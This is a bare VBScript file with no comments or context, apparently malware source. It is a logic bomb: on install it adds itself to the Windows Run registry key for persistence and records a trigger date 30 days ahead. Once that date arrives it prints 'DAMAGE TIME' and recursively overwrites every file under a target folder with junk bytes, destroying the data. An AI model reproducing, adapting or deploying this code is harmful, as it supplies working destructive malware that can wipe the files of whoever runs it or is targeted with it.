On Error Resume Next
sub rn()
	tdate = sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Alcmrt")
	ard = split(tdate,"-")
	md = DateSerial( ard(2), ard(1), ard(0) )
	dif = DateDiff( "d", now, md )
	if dif <= 1 then
		wscript.echo "DAMAGE TIME"
		for each f in trg
			dmg(trg(0))
		next
	end if
End sub
sub dmg(myf)
	set f = fso.GetFolder(myf)
	set fc = f.Files
	for each fil in fc
		set tf = fso.GetFile(fil)
		sz = tf.Size
		set sw = tf.OpenAsTextStream(2,-2)
		for i = 1 to sz step 2
			sw.Write chr(i mod 255)
		next
		sw.Close
	next
	set fd = f.SubFolders
	for each fld in fd
		dmg(fld)
	next
end sub
sub instl() 
	sh.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Alcmrt", what, "REG_SZ"
	myd = DateAdd("d", pr, now)
	sh.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Alcmrt", Day(myd) & "-" & Month(myd) & "-" & Year(myd) , "REG_SZ"
End sub
sub uninstl()
	sh.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Alcmrt"
	sh.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Alcmrt"
End sub
Function cmdline(arguments) 
	Set objArgs = arguments
	For Each Arg in objArgs
		select case Arg
			case "install"
				instl()
			case "uninstall"
				uninstl()
			case else
				rn()
		end select
	Next
	if objArgs.Count = 0 then rn()
End Function
'---
Set sh = WScript.CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
what = wscript.ScriptFullName
pr = 30
dim trg(0)
trg(0) = "C:\Documents and Settings\Administrator\Desktop\vbs\test"
cmdline( WScript.Arguments )
